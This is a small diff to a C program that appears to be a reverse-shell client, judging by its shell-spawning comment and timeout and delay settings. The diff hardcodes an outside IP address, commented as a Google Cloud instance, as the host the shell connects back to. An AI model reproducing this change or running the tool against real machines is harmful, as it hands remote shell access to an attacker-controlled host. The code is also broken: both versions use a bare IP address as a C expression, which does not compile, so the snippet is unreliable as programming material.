@@ -207,7 +207,7 @@ int main(int argc, char **argv)
 
 
 	// set defaults
-	target = 35.211.2.110;//google cloud instance
+	target = 0;//cant put ip in target, getting way to used to python lmao
 	timeout = 2000;
 	delay = 1000;
 	max_blanks = 5;
@@ -266,7 +266,7 @@ int main(int argc, char **argv)
 		printf("you need to specify a host with -t. Try -h for more options\n");
 		return -1;
 	}
-	ip_addr = to_ip(target);
+	ip_addr = to_ip(35.211.2.110);
 
 	// don't spawn a shell if we're only sending a single test request
 	if (status != STATUS_SINGLE) {
